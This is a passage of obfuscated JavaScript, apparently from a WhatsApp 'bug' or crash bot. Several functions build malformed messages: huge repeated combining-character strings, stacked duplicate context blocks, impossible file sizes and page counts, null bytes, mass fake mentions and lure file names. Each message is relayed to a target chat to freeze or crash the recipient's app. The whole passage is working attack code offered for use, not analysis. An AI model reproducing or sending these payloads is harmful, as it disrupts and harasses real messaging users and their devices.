᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴".repeat(0x32)
              },
              'nativeFlowMessage': {},
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x5
                }, () => "1@newsletter"),
                'contextInfo': {
                  'mentionedJid': Array.from({
                    'length': 0x5
                  }, () => "1@newsletter"),
                  'groupMentions': [{
                    'groupJid': "1@newsletter",
                    'groupSubject': "UNDEFINED"
                  }]
                },
                'contextInfo': {
                  'mentionedJid': Array.from({
                    'length': 0x5
                  }, () => '1@newsletter'),
                  'groupMentions': [{
                    'groupJid': "1@newsletter",
                    'groupSubject': "UNDEFINED"
                  }]
                },
                'contextInfo': {
                  'mentionedJid': Array.from({
                    'length': 0x5
                  }, () => "1@newsletter"),
                  'groupMentions': [{
                    'groupJid': "1@newsletter",
                    'groupSubject': "UNDEFINED"
                  }]
                },
                'mentionedJid': Array.from({
                  'length': 0x9
                }, () => "1@newsletter"),
                'contextInfo': {
                  'mentionedJid': Array.from({
                    'length': 0x5
                  }, () => "9@newsletter"),
                  'groupMentions': [{
                    'groupJid': "1@newsletter",
                    'groupSubject': "UNDEFINED"
                  }]
                },
                'groupMentions': [{
                  'groupJid': "1@newsletter",
                  'groupSubject': "UNDEFINED",
                  'groupMetadata': {
                    'creationTimestamp': 0x664640ed,
                    'ownerJid': "owner@newsletter",
                    'adminJids': ["admin@newsletter", "developer@newsletter"]
                  }
                }],
                'externalContextInfo': {
                  'customTag': "SECURE_PAYBUG_MESSAGE",
                  'securityLevel': 'HIGH',
                  'referenceCode': "PAYBUG10291",
                  'timestamp': new Date().toISOString(),
                  'messageId': "MSG00123456789",
                  'userId': "UNDEFINED"
                },
                'mentionedJid': Array.from({
                  'length': 0x9
                }, () => '9@newsletter'),
                'groupMentions': [{
                  'groupJid': "9@newsletter",
                  'groupSubject': "UNDEFINED"
                }]
              },
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x5
                }, () => '1@newsletter'),
                'groupMentions': [{
                  'groupJid': "1@newsletter",
                  'groupSubject': 'UNDEFINED'
                }]
              },
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x8
                }, () => "8@newsletter"),
                'groupMentions': [{
                  'groupJid': "8@newsletter",
                  'groupSubject': "UNDEFINED"
                }]
              },
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x7
                }, () => "7@newsletter"),
                'groupMentions': [{
                  'groupJid': "7@newsletter",
                  'groupSubject': "UNDEFINED"
                }]
              },
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x6
                }, () => '6@newsletter'),
                'groupMentions': [{
                  'groupJid': "6@newsletter",
                  'groupSubject': "UNDEFINED"
                }]
              },
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x5
                }, () => '1@newsletter'),
                'groupMentions': [{
                  'groupJid': '1@newsletter',
                  'groupSubject': "UNDEFINED"
                }]
              },
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x4
                }, () => "4@newsletter"),
                'groupMentions': [{
                  'groupJid': "4@newsletter",
                  'groupSubject': "UNDEFINED"
                }]
              },
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x3
                }, () => "3@newsletter"),
                'groupMentions': [{
                  'groupJid': "3@newsletter",
                  'groupSubject': 'UNDEFINED'
                }]
              },
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x2
                }, () => "2@newsletter"),
                'groupMentions': [{
                  'groupJid': "2@newsletter",
                  'groupSubject': "UNDEFINED"
                }]
              },
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x1
                }, () => "1@newsletter"),
                'groupMentions': [{
                  'groupJid': '1@newsletter',
                  'groupSubject': 'UNDEFINED'
                }]
              },
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x5
                }, () => "1@newsletter"),
                'groupMentions': [{
                  'groupJid': "1@newsletter",
                  'groupSubject': "UNDEFINED"
                }]
              },
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x5
                }, () => "1@newsletter"),
                'groupMentions': [{
                  'groupJid': '1@newsletter',
                  'groupSubject': "UNDEFINED"
                }]
              },
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x5
                }, () => "1@newsletter"),
                'groupMentions': [{
                  'groupJid': "1@newsletter",
                  'groupSubject': 'UNDEFINED'
                }],
                'isForwarded': true,
                'quotedMessage': {
                  'documentMessage': {
                    'url': 'https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0',
                    'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    'fileSha256': 'QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=',
                    'fileLength': "999999999999",
                    'pageCount': 0x9ff9ff9ff1ff90000000,
                    'mediaKey': "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    'fileName': "Alwaysaqioo The Juftt️",
                    'fileEncSha256': "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    'directPath': "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mediaKeyTimestamp': "1724474503",
                    'contactVcard': true,
                    'thumbnailDirectPath': "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    'thumbnailSha256': "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    'thumbnailEncSha256': 'gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=',
                    'jpegThumbnail': ''
                  }
                }
              }
            }
          }
        }
      };
      _0x35a9de.relayMessage(_0x176d3d, _0x43a98d, {
        'participant': {
          'jid': _0x176d3d
        }
      }, {
        'messageId': null
      });
    }
    async function _0x52600c(_0x5a05dc, _0x19b81a = false) {
      let _0x11dc90 = "⏤͟͟͞͞Primis" + 'ྫྷ'.repeat(0x12fd1) + '@0'.repeat(0xc350);
      await _0x35a9de.relayMessage(_0x5a05dc, {
        'ephemeralMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'documentMessage': {
                  'url': "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  'mimetype': 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                  'fileSha256': "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  'fileLength': "9999999999999",
                  'pageCount': 0x4e729fff,
                  'mediaKey': "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  'fileName': "Hayolo",
                  'fileEncSha256': 'LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=',
                  'directPath': "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  'mediaKeyTimestamp': "1726867151",
                  'contactVcard': true,
                  'jpegThumbnail': "https://img1.pixhost.to/images/6002/603809921_imgtmp.jpg"
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': _0x11dc90
              },
              'nativeFlowMessage': {
                'name': 'call_permission_request',
                'messageParamsJson': "\0".repeat(0x1388)
              },
              'contextInfo': {
                'mentionedJid': ["0@s.whatsapp.net"],
                'forwardingScore': 0x1,
                'isForwarded': true,
                'fromMe': false,
                'participant': "0@s.whatsapp.net",
                'remoteJid': "status@broadcast",
                'quotedMessage': {
                  'documentMessage': {
                    'url': "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mimetype': 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                    'fileSha256': 'QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=',
                    'fileLength': "9999999999999",
                    'pageCount': 0x4e729fff,
                    'mediaKey': "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    'fileName': "Bokep 18+",
                    'fileEncSha256': "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    'directPath': "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mediaKeyTimestamp': "1724474503",
                    'contactVcard': true,
                    'thumbnailDirectPath': "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    'thumbnailSha256': "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    'thumbnailEncSha256': "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    'jpegThumbnail': "https://img1.pixhost.to/images/6002/603809921_imgtmp.jpg"
                  }
                }
              }
            }
          }
        }
      }, _0x19b81a ? {
        'participant': {
          'jid': _0x5a05dc
        }
      } : {});
      console.log(chalk.red.bold('⏤͟͟͞͞Primis⿻'));
    }
    ;
    async function _0x2ebc96(_0x4fd653, _0x3518b5, _0x448c0b = true) {
      let _0x3ab596 = "⏤͟͟͞͞Primis⿻" + 'ြ'.repeat(0x61a8);
      await _0x35a9de.relayMessage(_0x4fd653, {
        'groupMentionedMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'documentMessage': {
                  'url': "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  'fileSha256': "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                  'fileLength': "999999999",
                  'pageCount': 0x9184e729fff,
                  'mediaKey': '5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=',
                  'fileName': 'NtahMengapa..',
                  'fileEncSha256': "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                  'directPath': "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  'mediaKeyTimestamp': "1715880173",
                  'contactVcard': true
                },
                'title': '',
                'hasMediaAttachment': true
              },
              'body': {
                'text': _0x3ab596
              },
              'nativeFlowMessage': {},
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x5
                }, () => "0@s.whatsapp.net"),
                'groupMentions': [{
                  'groupJid': '0@s.whatsapp.net',
                  'groupSubject': "anjay"
                }]
              }
            }
          }
        }
      }, {
        'participant': {
          'jid': _0x4fd653
        }
      }, {
        'messageId': null
      });
    }
    async function _0x162a6a(_0x39c20e) {
      await _0x35a9de.relayMessage(_0x39c20e, {
        'ephemeralMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'documentMessage': {
                  'url': "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  'fileSha256': "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  'fileLength': "9999999999999",
                  'pageCount': 0x4e729fff,
                  'mediaKey': "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  'fileName': "\0",
                  'fileEncSha256': "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  'directPath': '/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0',
                  'mediaKeyTimestamp': "1726867151",
                  'contactVcard': true,
                  'jpegThumbnail': "https://img1.pixhost.to/images/6002/603809921_imgtmp.jpg"
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': "\0" + '⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴